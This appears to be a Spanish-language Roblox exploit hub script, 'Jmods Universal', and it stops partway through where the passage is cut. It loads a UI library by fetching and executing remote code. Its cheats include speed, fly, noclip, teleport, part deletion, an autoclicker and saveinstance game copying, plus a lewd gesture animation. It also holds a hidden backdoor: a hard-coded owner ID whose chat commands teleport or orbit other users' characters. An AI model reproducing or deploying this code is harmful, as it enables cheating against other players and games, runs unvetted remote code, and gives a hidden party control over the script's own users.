local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

-- Crear ventana
local Window = Rayfield:CreateWindow({
    Name = "Jmods Universal",
    Icon = 13458017478,
    LoadingTitle = "Jmods Universal",
    LoadingSubtitle = "joao_mods",
    Theme = "Bloom",
    DisableRayfieldPrompts = true,
    DisableBuildWarnings = false,
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "JmodsUniversal",
        FileName = "joao_mods"
    },
    Discord = {
        Enabled = true,
        Invite = "4gGUz2tk",
        RememberJoins = false
    },
    KeySystem = false,
    KeySettings = {
        Title = "Jmods",
        Subtitle = "Key",
        Note = "la key la tiene joao (POSIBLE MANTENIMIENTO)",
        FileName = "key",
        SaveKey = false,
        GrabKeyFromSite = false,
        Key = {"keyjoao"}
    }
})

task.spawn(function()
    repeat task.wait() until game:IsLoaded()

    -- Variables globales
    local LocalPlayer = game.Players.LocalPlayer
    local ownerId = 4591285210
    local Orbiting = false
    local RunService = game:GetService("RunService")

    -- Función para teletransportar al Owner
    local function TeleportToOwner()
        local owner = game.Players:GetPlayerByUserId(ownerId)
        if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
            local ownerPos = owner.Character.HumanoidRootPart.Position
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(ownerPos + Vector3.new(0, 6, 0))
            end
        end
    end

    -- Función para iniciar la rotación alrededor del Owner
    local function StartOrbit()
        if LocalPlayer.UserId == ownerId or Orbiting then return end

        Orbiting = true

        RunService:BindToRenderStep("OrbitAroundOwner", Enum.RenderPriority.Character.Value, function()
            if not Orbiting then
                RunService:UnbindFromRenderStep("OrbitAroundOwner")
                return
            end
            local owner = game.Players:GetPlayerByUserId(ownerId)
            if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") and
               LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local time = tick()
                local radius = 10
                local speed = 2

                local x = math.cos(time * speed) * radius
                local z = math.sin(time * speed) * radius

                local ownerPos = owner.Character.HumanoidRootPart.Position
                local newPos = ownerPos + Vector3.new(x, 3, z)

                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(newPos, ownerPos)
            end
        end)
    end

    -- Función para detener la rotación
    local function StopOrbit()
        Orbiting = false
        RunService:UnbindFromRenderStep("OrbitAroundOwner")
    end

    -- Función para manejar comandos del Owner
    local function OwnerChatHandler(message)
        local msg = message:lower()
        if msg == ".t" then
            TeleportToOwner()
            pcall(function()
                Rayfield:Notify({
                    Title = "Jmods Universal",
                    Content = "Has sido teletransportado ENCIMA del Owner.",
                    Duration = 5,
                    Image = 4483362458,
                })
            end)
        elseif msg == ".u" then
            StartOrbit()
            pcall(function()
                Rayfield:Notify({
                    Title = "Jmods Universal",
                    Content = "Comenzaste a orbitar alrededor del Owner.",
                    Duration = 5,
                    Image = 4483362458,
                })
            end)
        elseif msg == ".uu" then
            StopOrbit()
            pcall(function()
                Rayfield:Notify({
                    Title = "Jmods Universal",
                    Content = "Detuviste la órbita alrededor del Owner.",
                    Duration = 5,
                    Image = 4483362458,
                })
            end)
        end
    end

    -- Función para verificar y conectar a los dueños
    local function CheckAndConnectPlayers()
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player.UserId == ownerId and not player:FindFirstChild("__JmodsConnected") then
                local marker = Instance.new("BoolValue")
                marker.Name = "__JmodsConnected"
                marker.Parent = player
                player.Chatted:Connect(OwnerChatHandler)
            end
        end
    end

    -- Conectar al entrar jugadores
    game.Players.PlayerAdded:Connect(function(player)
        task.wait(0.5)  -- Menor espera para reducir impacto
        if player.UserId == ownerId then
            CheckAndConnectPlayers()
        end
    end)

    -- Chequeo inicial
    CheckAndConnectPlayers()
end)

-- FUNCIONES DE TEMA
local themeSavePath = "JmodsUniversal/SelectedTheme.txt"

local function SaveTheme(themeName)
    if not isfile(themeSavePath) then
        makefolder("JmodsUniversal")
    end
    writefile(themeSavePath, themeName)
end

local function LoadSavedTheme()
    if isfile(themeSavePath) then
        local theme = readfile(themeSavePath)
        Window.ModifyTheme(theme)
    else
        Window.ModifyTheme("Bloom") -- Default si no hay guardado
    end
end

-- Cargar tema guardado
LoadSavedTheme()

-- SECCIÓN PRINCIPAL
MainTab = Window:CreateTab("Principal", nil) -- Title, Image
MainSection = MainTab:CreateSection("Main")


    Rayfield:Notify({
           Title = "Bienvenido",
       Content = "joao_mods te espera en youtube",
       Duration = 15,
       Image = 13458017478,
             Callback = function()
          end

    })
    
    
---barra de velocidad---
Slider = MainTab:CreateSlider({
       Name = "Velocidad al correr",
       Range = {1, 500},
       Increment = 1,
       Suffix = "velocidad",
       CurrentValue = 16,
       Flag = "sliderws", -- 
       Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
       end,
    })
    



----barra Salto----
Slider = MainTab:CreateSlider({
       Name = "Salto",
       Range = {1, 500},
       Increment = 1,
       Suffix = "Poder",
       CurrentValue = 16,
       Flag = "sliderjp", 
       Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
       end,
    })



    

-- Servicios
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")

-- Variables compartidas
local player = Players.LocalPlayer
local character, hrp, humanoid
local currentSpeed = 16
local currentJumpHeight = 0.61
local keysPressed = {}
local sliding = false
local jumping = false
local toggleActive = false
local jumpKey = Enum.KeyCode.Space

-- UI móvil
local touchGui = Instance.new("ScreenGui")
touchGui.Name = "TouchControls"
touchGui.ResetOnSpawn = false
touchGui.Parent = player:WaitForChild("PlayerGui")

local jumpButton, wasdFrame

-- Funciones para crear UI
local function createJumpButton()
	if jumpButton then jumpButton:Destroy() end

	jumpButton = Instance.new("TextButton")
	jumpButton.Size = UDim2.new(0, 100, 0, 100)
	jumpButton.Position = UDim2.new(1, -120, 1, -120)
	jumpButton.Text = "⭧"
	jumpButton.TextScaled = true
	jumpButton.BackgroundColor3 = Color3.new(1, 1, 1)
	jumpButton.BackgroundTransparency = 0.2
	jumpButton.Parent = touchGui

	jumpButton.MouseButton1Down:Connect(function()
		if toggleActive then
			jumping = true
		end
	end)

	jumpButton.MouseButton1Up:Connect(function()
		jumping = false
	end)
end

local function createWASDFrame()
	if wasdFrame then wasdFrame:Destroy() end

	wasdFrame = Instance.new("Frame")
	wasdFrame.Size = UDim2.new(0, 200, 0, 200)
	wasdFrame.Position = UDim2.new(0, 20, 1, -220)
	wasdFrame.BackgroundTransparency = 1
	wasdFrame.Parent = touchGui

	local directions = {
		{key = Enum.KeyCode.W, pos = UDim2.new(0.5, -25, 0, 0), txt = "W"},
		{key = Enum.KeyCode.S, pos = UDim2.new(0.5, -25, 0, 100), txt = "S"},
		{key = Enum.KeyCode.A, pos = UDim2.new(0, 0, 0, 100), txt = "A"},
		{key = Enum.KeyCode.D, pos = UDim2.new(1, -50, 0, 100), txt = "D"},
	}

	for _, dir in ipairs(directions) do
		local btn = Instance.new("TextButton")
		btn.Size = UDim2.new(0, 50, 0, 50)
		btn.Position = dir.pos
		btn.Text = dir.txt
		btn.BackgroundColor3 = Color3.new(1, 1, 1)
		btn.BackgroundTransparency = 0.2
		btn.TextScaled = true
		btn.Parent = wasdFrame

		btn.MouseButton1Down:Connect(function()
			keysPressed[dir.key] = true
		end)

		btn.MouseButton1Up:Connect(function()
			keysPressed[dir.key] = false
		end)
	end
end

-- Input
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end
	if input.KeyCode then
		keysPressed[input.KeyCode] = true
	end
	if input.KeyCode == jumpKey and toggleActive then
		jumping = true
	end
end)

UserInputService.InputEnded:Connect(function(input, gpe)
	if gpe then return end
	if input.KeyCode then
		keysPressed[input.KeyCode] = false
	end
	if input.KeyCode == jumpKey then
		jumping = false
	end
end)

-- Dirección
local function getDirection()
	local camCF = workspace.CurrentCamera.CFrame
	local moveDir = Vector3.zero

	if keysPressed[Enum.KeyCode.W] then moveDir += camCF.LookVector end
	if keysPressed[Enum.KeyCode.S] then moveDir -= camCF.LookVector end
	if keysPressed[Enum.KeyCode.A] then moveDir -= camCF.RightVector end
	if keysPressed[Enum.KeyCode.D] then moveDir += camCF.RightVector end

	moveDir = Vector3.new(moveDir.X, 0, moveDir.Z)
	return moveDir.Magnitude > 0 and moveDir.Unit or Vector3.zero
end

-- Movimiento
RunService.RenderStepped:Connect(function(dt)
	if sliding and hrp and character then
		local dir = getDirection()
		if dir.Magnitude > 0 then
			hrp.CFrame += dir * currentSpeed * dt
		end
	end
	if jumping and toggleActive and hrp then
		hrp.CFrame = hrp.CFrame + Vector3.new(0, currentJumpHeight, 0)
	end
end)

-- Setup personaje
local function setupCharacter(char)
	character = char
	hrp = character:WaitForChild("HumanoidRootPart")
	humanoid = character:WaitForChild("Humanoid")
	hrp.Anchored = false

	if sliding then
		humanoid.WalkSpeed = 0
	else
		humanoid.WalkSpeed = 16
	end
end

if player.Character then setupCharacter(player.Character) end
player.CharacterAdded:Connect(setupCharacter)

-- UI con Rayfield o el sistema que uses
MainTab:CreateToggle({
	Name = "Modo deslizamiento",
	CurrentValue = false,
	Flag = "slidetoggle",
	Callback = function(Value)
		sliding = Value
		if humanoid then
			humanoid.WalkSpeed = Value and 0 or 16
		end
		if UserInputService.TouchEnabled then
			if Value then
				createWASDFrame()
			elseif wasdFrame then
				wasdFrame:Destroy()
			end
		end
	end,
})

MainTab:CreateSlider({
	Name = "Velocidad deslizarse",
	Range = {1, 500},
	Increment = 1,
	Suffix = "velocidad",
	CurrentValue = currentSpeed,
	Flag = "sliderws",
	Callback = function(Value)
		currentSpeed = Value
	end,
})

MainTab:CreateToggle({
	Name = "Salto Deslizado",
	CurrentValue = false,
	Flag = "jumptoggle",
	Callback = function(Value)
		toggleActive = Value
		if not Value then
			jumping = false
		end
		if UserInputService.TouchEnabled then
			if Value then
				createJumpButton()
			elseif jumpButton then
				jumpButton:Destroy()
			end
		end
	end,
})

MainTab:CreateSlider({
	Name = "Altura del Salto",
	Range = {0.01, 4},
	Increment = 0.01,
	Suffix = " altura",
	CurrentValue = currentJumpHeight,
	Flag = "sliderjumpheight",
	Callback = function(Value)
		currentJumpHeight = Value
	end,
})







---Salto infinito----

Button = MainTab:CreateButton({
   Name = "Salto infinito",
   Callback = function()
       -- Toggles 
       _G.infinjump = not _G.infinjump

       -- Notificación
       game.StarterGui:SetCore("SendNotification", {
           Title = "jmods",
           Text = _G.infinjump and "Salto infinito Activado!" or "Salto infinito Desactivado!",
           Duration = 5;
       })

       if _G.infinJumpStarted == nil then
           _G.infinJumpStarted = true

           local plr = game:GetService('Players').LocalPlayer
           local m = plr:GetMouse()
           local UIS = game:GetService("UserInputService")

           -- Teclado (PC)
           m.KeyDown:Connect(function(k)
               if _G.infinjump and k:byte() == 32 then
                   local humanoid = plr.Character and plr.Character:FindFirstChildOfClass('Humanoid')
                   if humanoid then
                       humanoid:ChangeState('Jumping')
                       wait()
                       humanoid:ChangeState('Seated')
                   end
               end
           end)

           -- Soporte Móvil (Touch/Jump Button)
           UIS.JumpRequest:Connect(function()
               if _G.infinjump then
                   local humanoid = plr.Character and plr.Character:FindFirstChildOfClass('Humanoid')
                   if humanoid then
                       humanoid:ChangeState('Jumping')
                       wait()
                       humanoid:ChangeState('Seated')
                   end
               end
           end)
       end
   end,
})





----Pajas----   
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local toggleActive = false
local currentSpeed = 1
local track = nil
local humanoid = nil

-- Función para iniciar la animación
local function playLoopedAnimation()
	task.spawn(function()
		while toggleActive and humanoid do
			if track then
				track:Stop()
				track = nil
			end

			local isR15 = humanoid.RigType == Enum.HumanoidRigType.R15
			local anim = Instance.new("Animation")
			anim.AnimationId = isR15 and "rbxassetid://698251653" or "rbxassetid://72042024"
			track = humanoid:LoadAnimation(anim)

			local endTime = isR15 and 0.7 or 0.65

			track:Play()
			track:AdjustSpeed(currentSpeed)
			track.TimePosition = 0.6

			-- Espera hasta que termine o se apague el toggle
			while track and toggleActive and track.TimePosition < endTime do
				task.wait(0.05)
				track:AdjustSpeed(currentSpeed)
			end

			if track then
				track:Stop()
				track = nil
			end
		end
	end)
end

-- Toggle de animación
MainTab:CreateToggle({
	Name = "Animación Paja",
	CurrentValue = false,
	Flag = "PajaToggle",
	Callback = function(Value)
		toggleActive = Value

		local character = player.Character or player.CharacterAdded:Wait()
		humanoid = character:FindFirstChildWhichIsA("Humanoid")

		if toggleActive then
			playLoopedAnimation()
		elseif track then
			track:Stop()
			track = nil
		end
	end,
})

-- Slider de velocidad
MainTab:CreateSlider({
	Name = "Velocidad de Animación",
	Range = {0.1, 1},
	Increment = 0.1,
	Suffix = "x",
	CurrentValue = currentSpeed,
	Flag = "SpeedSlider",
	Callback = function(Value)
		currentSpeed = Value
		if track then
			track:AdjustSpeed(currentSpeed)
		end
	end,
})

-- Reinicio del personaje
player.CharacterAdded:Connect(function(char)
	humanoid = char:WaitForChild("Humanoid")
	if toggleActive then
		playLoopedAnimation()
	end
end)







----Recuperar VC---
Button = MainTab:CreateButton({
   Name = "Recuperar Vc",
   Callback = function()
   game:GetService("VoiceChatService"):joinVoice()-- The function that takes place when the button is pressed
   end,
})

---Spin

local spinActive = false
local spinSpeed = 10 -- Velocidad predeterminada del giro
local spinAngle = 0

local function toggleSpin()
    spinActive = not spinActive
    if spinActive then
        Rayfield:Notify({
            Title = "Spin Activado",
            Content = "El giro ha comenzado.",
            Duration = 3,
            Image = 4483362458
        })
    else
        Rayfield:Notify({
            Title = "Spin Desactivado",
            Content = "El giro ha sido detenido.",
            Duration = 3,
            Image = 4483362458
        })
    end
end

local spinToggle = MainTab:CreateToggle({
    Name = "Spin",
    Callback = function()
        toggleSpin()
    end
})

-- Slider para ajustar la velocidad del Spin
MainTab:CreateSlider({
    Name = "Velocidad de Spin",
    Range = {1, 50},
    Increment = 1,
    Suffix = "vel",
    CurrentValue = spinSpeed,
    Callback = function(value)
        spinSpeed = value
    end
})

game:GetService("RunService").Heartbeat:Connect(function(dt)
    if spinActive then
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            spinAngle = spinAngle + spinSpeed * dt
            character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(spinSpeed), 0)
        end
    end
end)




----Reset

Button = MainTab:CreateButton({
   Name = "Respawn",
   Callback = function()
		game.Players.LocalPlayer.Character:BreakJoints()
   end,
})

 -----Refresh---
 Button = MainTab:CreateButton({
    Name = "Respawn Guardando posición",
    Callback = function()
        local player = Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local hrp = character:FindFirstChild("HumanoidRootPart")

        if hrp then
            local savedCFrame = hrp.CFrame

            -- Conectamos a CharacterAdded para volver a teletransportarlo cuando reaparezca
            local connection
            connection = player.CharacterAdded:Connect(function(char)
                local newHrp = char:WaitForChild("HumanoidRootPart", 5)
                if newHrp then
                    newHrp.CFrame = savedCFrame
                end
                connection:Disconnect()
            end)

            -- Matamos al personaje
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                humanoid.Health = 0
            end
        end
    end,
})






---Quitar cooldown E---

Button = MainTab:CreateButton({
   Name = "Quitar Cooldown E",
   Callback = function()
   for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
	if v:IsA("ProximityPrompt") then
		v["HoldDuration"] = 0
	end
end
 
 
game:GetService("ProximityPromptService").PromptButtonHoldBegan:Connect(function(v)
    v["HoldDuration"] = 0
end)
   end,
})


---Gravedad---	
Button = MainTab:CreateButton({
   Name = "Gravedad 0",
   Callback = function()
   local plr = game:GetService("Players").LocalPlayer
local normalGravity = workspace.Gravity


local function MUBRZ_fake_script()

    workspace.Gravity = 0

    local humanoid = plr.Character:FindFirstChildWhichIsA("Humanoid")
    if humanoid then
        humanoid.Sit = true
        task.wait(0.1) -- Esperamos un poco


        humanoid.RootPart.CFrame = humanoid.RootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)

        
        for _, v in ipairs(humanoid:GetPlayingAnimationTracks()) do
            v:Stop()
        end
    end


    game:GetService("UserInputService").JumpRequest:Connect(function()
        workspace.Gravity = normalGravity 	
    end)
end


coroutine.wrap(MUBRZ_fake_script)()


   end,
})
----Noclip----

local noclipEnabled = false
local noclipConnection
local originalCollisions = {}

MainTab:CreateToggle({
    Name = "Noclip Act/Des",
    Flag = "NoclipToggle", -- <--- Añadido Flag
    CurrentValue = false,
    Callback = function(state)
        noclipEnabled = state
        local character = game.Players.LocalPlayer.Character

        if noclipEnabled then
            -- Guardar estado original
            originalCollisions = {}
            for _, part in ipairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    originalCollisions[part] = part.CanCollide
                end
            end

            noclipConnection = game:GetService("RunService").Stepped:Connect(function()
                for part, _ in pairs(originalCollisions) do
                    if part and part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end)
        else
            if noclipConnection then
                noclipConnection:Disconnect()
                noclipConnection = nil
            end
            -- Restaurar el estado original
            for part, originalState in pairs(originalCollisions) do
                if part and part:IsA("BasePart") then
                    part.CanCollide = originalState
                end
            end
            originalCollisions = {}
        end
    end,
})






------Fly-----

local UIS = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
local RootPart = Character:FindFirstChild("HumanoidRootPart")

local FlyEnabled = false
local FlySpeed = 50
local Connection
local MobileGui = nil

local MobileMove = {
    Forward = false,
    Backward = false,
    Left = false,
    Right = false,
    Up = false,
    Down = false,
}

-- Función para actualizar el personaje y sus componentes
local function UpdateCharacter(newCharacter)
    Character = newCharacter
    Humanoid = Character:FindFirstChildWhichIsA("Humanoid")
    RootPart = Character:FindFirstChild("HumanoidRootPart")
end

-- Actualizar referencias cuando el personaje cambia
LocalPlayer.CharacterAdded:Connect(function(newCharacter)
    newCharacter:WaitForChild("HumanoidRootPart")
    newCharacter:WaitForChild("Humanoid")
    UpdateCharacter(newCharacter)
    if FlyEnabled then
        ToggleFly(false)
        ToggleFly(true)
    end
end)

-- Crear controles móviles
local function CreateMobileControls()
    if not UIS.TouchEnabled or MobileGui then return end

    MobileGui = Instance.new("ScreenGui")
    MobileGui.Name = "MobileFlyControls"
    MobileGui.ResetOnSpawn = false
    MobileGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local ButtonSize = UDim2.new(0, 60, 0, 60)

    local function CreateButton(name, position, onPress, onRelease)
        local Button = Instance.new("TextButton")
        Button.Name = name
        Button.Size = ButtonSize
        Button.Position = position
        Button.Text = name
        Button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        Button.TextColor3 = Color3.new(1, 1, 1)
        Button.AutoButtonColor = false
        Button.Parent = MobileGui

        Button.MouseButton1Down:Connect(function()
            onPress()
        end)

        Button.MouseButton1Up:Connect(function()
            onRelease()
        end)
    end

    CreateButton("W", UDim2.new(0, 80, 1, -180), function() MobileMove.Forward = true end, function() MobileMove.Forward = false end)
    CreateButton("S", UDim2.new(0, 80, 1, -60), function() MobileMove.Backward = true end, function() MobileMove.Backward = false end)
    CreateButton("A", UDim2.new(0, 20, 1, -120), function() MobileMove.Left = true end, function() MobileMove.Left = false end)
    CreateButton("D", UDim2.new(0, 140, 1, -120), function() MobileMove.Right = true end, function() MobileMove.Right = false end)
    CreateButton("Up", UDim2.new(1, -120, 1, -180), function() MobileMove.Up = true end, function() MobileMove.Up = false end)
    CreateButton("Down", UDim2.new(1, -120, 1, -100), function() MobileMove.Down = true end, function() MobileMove.Down = false end)
end

local function DestroyMobileControls()
    if MobileGui then
        MobileGui:Destroy()
        MobileGui = nil
    end
    for key in pairs(MobileMove) do
        MobileMove[key] = false
    end
end

--toggle
function ToggleFly(state)
    if not RootPart or not Humanoid then
        return
    end

    FlyEnabled = state

    if FlyEnabled then
        -- Activar controles móviles si es touch
        if UIS.TouchEnabled then
            CreateMobileControls()
        end

        Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        Humanoid:ChangeState(Enum.HumanoidStateType.Physics)

        Connection = RunService.RenderStepped:Connect(function()
            local MoveDirection = Vector3.new()
            local cameraCFrame = Workspace.CurrentCamera.CFrame
            local forward = cameraCFrame.LookVector
            local right = cameraCFrame.RightVector
            local up = Vector3.new(0, 1, 0)

            if UIS:IsKeyDown(Enum.KeyCode.W) or MobileMove.Forward then MoveDirection = MoveDirection + forward end
            if UIS:IsKeyDown(Enum.KeyCode.S) or MobileMove.Backward then MoveDirection = MoveDirection - forward end
            if UIS:IsKeyDown(Enum.KeyCode.A) or MobileMove.Left then MoveDirection = MoveDirection - right end
            if UIS:IsKeyDown(Enum.KeyCode.D) or MobileMove.Right then MoveDirection = MoveDirection + right end
            if UIS:IsKeyDown(Enum.KeyCode.Space) or MobileMove.Up then MoveDirection = MoveDirection + up end
            if UIS:IsKeyDown(Enum.KeyCode.LeftShift) or MobileMove.Down then MoveDirection = MoveDirection - up end

            if MoveDirection.Magnitude == 0 then
                RootPart.Velocity = Vector3.new(0, 0, 0)
            else
                RootPart.Velocity = MoveDirection.Unit * FlySpeed
            end
        end)
    else
        if Connection then
            Connection:Disconnect()
            Connection = nil
        end

        Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
        Humanoid:ChangeState(Enum.HumanoidStateType.Freefall)

        -- Desactivar controles móviles si estaban activos
        DestroyMobileControls()
    end
end

-- UI Rayfield
FlyToggle = MainTab:CreateToggle({
    Name = "Volar Gravedad 0",
    CurrentValue = false,
    Callback = function(state)
        ToggleFly(state)
    end
})

FlySpeedSlider = MainTab:CreateSlider({
    Name = "Velocidad Gravedad 0",
    Range = {0, 300},
    Increment = 5,
    Suffix = "Velocidad",
    CurrentValue = FlySpeed,
    Callback = function(value)
        FlySpeed = value
    end
})






---Zoon sin limite--

local LocalPlayer = Players.LocalPlayer
local CameraMaxZoom = 4000  
local DefaultMaxZoom = LocalPlayer.CameraMaxZoomDistance  -- Guardar el valor original

local ZoomUnlocked = false

local function ToggleZoom(state)
    ZoomUnlocked = state

    if ZoomUnlocked then
        LocalPlayer.CameraMaxZoomDistance = CameraMaxZoom
    else
        LocalPlayer.CameraMaxZoomDistance = DefaultMaxZoom
    end
end

-- Crear el Toggle en Rayfield
ZoomToggle = MainTab:CreateToggle({
    Name = "Zoom sin limite",
    CurrentValue = false,
    Callback = function(state)
        ToggleZoom(state)
    end
})

-----Fog-----

local Lighting = game:GetService("Lighting")

-- Guardamos los valores originales del fog
local originalFogStart = Lighting.FogStart
local originalFogEnd = Lighting.FogEnd
local originalFogColor = Lighting.FogColor

-- Función para quitar el fog
local function removeFog()
    Lighting.FogStart = 1000000  
    Lighting.FogEnd = 1000000    

end

-- Función para restaurar el fog a su estado original
local function restoreFog()
    Lighting.FogStart = originalFogStart  
    Lighting.FogEnd = originalFogEnd    
    Lighting.FogColor = originalFogColor 

end


Toggle = MainTab:CreateToggle({
    Name = "Quitar Fog",
    CurrentValue = false,  
    Flag = "RemoveFogToggle",  
    Callback = function(value)
        if value then
            removeFog()  
        else
            restoreFog()  
        end
    end,
})

---Fov---

local FOVEnabled = false
local LastFOVValue = workspace.CurrentCamera.FieldOfView

-- Toggle para activar/desactivar el FOV personalizado
MainTab:CreateToggle({
    Name = "FOV",
    CurrentValue = false,
    Flag = "FOVEnabledToggle",
    Callback = function(state)
        FOVEnabled = state
        if not state then
            workspace.CurrentCamera.FieldOfView = 70
        else
            workspace.CurrentCamera.FieldOfView = LastFOVValue
        end
    end,
})

-- Slider para el FOV
MainTab:CreateSlider({
    Name = "Cambiar Fov",
    Range = {40, 120},
    Increment = 1,
    Suffix = "°",
    CurrentValue = LastFOVValue,
    Flag = "FOVSlider",
    Callback = function(val)
        LastFOVValue = val
        if FOVEnabled then
            workspace.CurrentCamera.FieldOfView = val
        end
    end,
})




----CLick tp y delete
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local mouse = player:GetMouse()

local humanoidRootPart
local ctrlPressed = false
local altPressed = false

-- Función para actualizar HRP
local function updateCharacter()
    local character = player.Character or player.CharacterAdded:Wait()
    humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
end
task.spawn(updateCharacter)
player.CharacterAdded:Connect(updateCharacter)

-- Estados de toggle
local teleportEnabled = false
local deleteEnabled = false

-- Esperar a que MainTab exista antes de crear los toggles
local function waitForMainTab()
    while not MainTab do
        task.wait(0.1)  -- Esperar hasta que MainTab esté disponible
    end
end

-- Llamar a waitForMainTab antes de crear los toggles
task.spawn(function()
    waitForMainTab()

    -- Crear los toggles en MainTab
    pcall(function()
        MainTab:CreateToggle({
            Name = "Control Click Teleport",
            CurrentValue = false,
            Flag = "TeleportToggle",
            Callback = function(v) teleportEnabled = v end,
        })

        MainTab:CreateToggle({
            Name = "Alt + Click Delete",
            CurrentValue = false,
            Flag = "AltClickDeleteToggle",
            Callback = function(v) deleteEnabled = v end,
        })
    end)
end)

-- Input
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.UserInputType == Enum.UserInputType.Keyboard then
        if input.KeyCode == Enum.KeyCode.LeftControl then ctrlPressed = true end
        if input.KeyCode == Enum.KeyCode.LeftAlt then altPressed = true end
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Keyboard then
        if input.KeyCode == Enum.KeyCode.LeftControl then ctrlPressed = false end
        if input.KeyCode == Enum.KeyCode.LeftAlt then altPressed = false end
    end
end)

-- Click handler
mouse.Button1Down:Connect(function()
    local target = mouse.Target
    if teleportEnabled and ctrlPressed and humanoidRootPart then
        humanoidRootPart.CFrame = CFrame.new(mouse.Hit.Position)
    end
    if deleteEnabled and altPressed and target and target:IsA("BasePart") then
        target:Destroy()
    end
end)


---Ver FPS--
local fpsGui
local FpsLabel
local fpsConnection
local selectedColor = Color3.fromRGB(44, 255, 8)

-- Puedes cambiar esta posición si quieres mover el visor manualmente
local fpsPosition = UDim2.new(0.786, 0, 0, 0) -- Esquina superior derecha

-- Toggle para mostrar u ocultar el visor de FPS
Toggle = MainTab:CreateToggle({
    Name = "Mostrar FPS",
    CurrentValue = false,
    Flag = "FPS_Toggle",
    Callback = function(state)
        if state then
            -- Crear GUI de FPS
            fpsGui = Instance.new("ScreenGui")
            FpsLabel = Instance.new("TextLabel")

            fpsGui.Name = "FPSGui"
            fpsGui.ResetOnSpawn = false
            fpsGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            fpsGui.Parent = game.CoreGui

            FpsLabel.Name = "FpsLabel"
            FpsLabel.Parent = fpsGui
            FpsLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            FpsLabel.BackgroundTransparency = 1
            FpsLabel.Position = fpsPosition
            FpsLabel.Size = UDim2.new(0, 125, 0, 25)
            FpsLabel.Font = Enum.Font.SourceSans
            FpsLabel.TextColor3 = selectedColor
            FpsLabel.TextScaled = true
            FpsLabel.Text = "FPS: ..."
            FpsLabel.TextWrapped = true

            fpsConnection = RunService.RenderStepped:Connect(function(dt)
                if not FpsLabel or not FpsLabel.Parent then
                    if fpsConnection then fpsConnection:Disconnect() end
                    return
                end
                FpsLabel.Text = "FPS: " .. math.round(1 / dt)
            end)
        else
            -- Eliminar GUI y desconectar
            if fpsGui then fpsGui:Destroy() fpsGui = nil end
            if fpsConnection then fpsConnection:Disconnect() fpsConnection = nil end
        end
    end,
})

-- ColorPicker para cambiar el color del texto FPS
MainTab:CreateColorPicker({
    Name = "Color de FPS",
    Color = selectedColor,
    Flag = "FPS_Color",
    Callback = function(color)
        selectedColor = color
        if FpsLabel then
            FpsLabel.TextColor3 = selectedColor
        end
    end,
})

-- Slider para cambiar el tamaño del texto FPS
MainTab:CreateSlider({
    Name = "Tamaño del texto FPS",
    Range = {10, 50},
    Increment = 1,
    Suffix = "+",
    CurrentValue = 20,
    Callback = function(size)
        if FpsLabel then
            FpsLabel.TextScaled = false -- Para usar TextSize directamente
            FpsLabel.TextSize = size
        end
    end
})




----Guardar juegos---

Button = MainTab:CreateButton({

    Name = "Guardar juego",
    Callback = function()
        saveinstance();
    end,
 })
 





----Autoclicker----

local VirtualInputManager = game:GetService("VirtualInputManager")

-- Estados
local autoClicking = false
local toggleEnabled = false
local clickDelay = 0.1 -- valor inicial, ajustable por el slider

-- Bucle del autoclicker
task.spawn(function()
	while task.wait() do
		if autoClicking and toggleEnabled then
			VirtualInputManager:SendMouseButtonEvent(0, 0, 0, true, game, 0)
			VirtualInputManager:SendMouseButtonEvent(0, 0, 0, false, game, 0)
		end
		task.wait(clickDelay)
	end
end)

-- Toggle (maestro)
AutoClickerToggle = MainTab:CreateToggle({
	Name = "Auto Clicker (primero activar)",
	CurrentValue = false,
	Flag = "AutoClickerToggle",
	Callback = function(Value)
		toggleEnabled = Value
		if not Value then
			autoClicking = false
		end
	end,
})

-- Keybind (solo funciona si el toggle está activo)
MainTab:CreateKeybind({
	Name = "Bind Auto Click",
	CurrentKeybind = "E",
	HoldToInteract = false,
	Flag = "AutoClickerKeybind",
	Callback = function()
		if toggleEnabled then
			autoClicking = not autoClicking
		end
	end,
})

-- Slider para velocidad (menor = más rápido)
MainTab:CreateSlider({
	Name = "Velocidad AutoClicker",
	Range = {0, 1}, -- 0.01 = muy rápido, 1 = más lento
	Increment = 0.01,
	Suffix = "s",
	CurrentValue = clickDelay,
	Flag = "ClickDelaySlider",
	Callback = function(Value)
		clickDelay = Value
